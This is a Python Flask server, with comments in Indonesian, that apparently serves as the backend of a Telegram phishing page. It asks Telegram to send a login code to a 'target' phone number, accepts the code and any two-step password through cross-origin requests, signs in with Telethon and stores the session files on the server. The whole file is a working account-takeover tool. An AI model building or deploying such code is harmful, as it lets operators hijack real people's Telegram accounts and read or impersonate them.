import os, asyncio, json, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

app = Flask(__name__)
CORS(app)

# Ambil dari Variables Railway
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

# Kamus sementara untuk simpan client yang sedang aktif
active_clients = {}

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nomor = data.get('nomor') # Format: +628xxx
    
    # LANGKAH 1: Minta OTP ke Telegram
    client = TelegramClient(f"{SESSION_DIR}{nomor}", API_ID, API_HASH)
    await client.connect()
    
    try:
        # Kirim kode ke Telegram target
        sent_code = await client.send_code_request(nomor)
        active_clients[nomor] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return jsonify({"status": "sent", "message": "Kode OTP dikirim ke Telegram"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi_2fa = data.get('sandi') # Opsional jika target pakai 2FA

    if nomor not in active_clients:
        return jsonify({"status": "error", "message": "Sesi kadaluarsa, ulangi lagi"}), 400

    client_data = active_clients[nomor]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]

    try:
        # LANGKAH 2: Validasi OTP
        await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
        
        # JIKA LOLOS (OTP BENAR)
        return jsonify({"status": "success", "message": "Login Berhasil!"}), 200

    except SessionPasswordNeededError:
        # JIKA BUTUH VERIFIKASI 2 LANGKAH (Sandi)
        if sandi_2fa:
            try:
                await client.sign_in(password=sandi_2fa)
                return jsonify({"status": "success", "message": "Login Berhasil (2FA)!"}), 200
            except:
                return jsonify({"status": "error", "message": "Sandi 2FA salah!"}), 400
        return jsonify({"status": "need_2fa", "message": "Masukkan Sandi 2FA"}), 200

    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kode OTP salah!"}), 400
    except PhoneCodeExpiredError:
        return jsonify({"status": "error", "message": "Kode OTP sudah kadaluarsa!"}), 400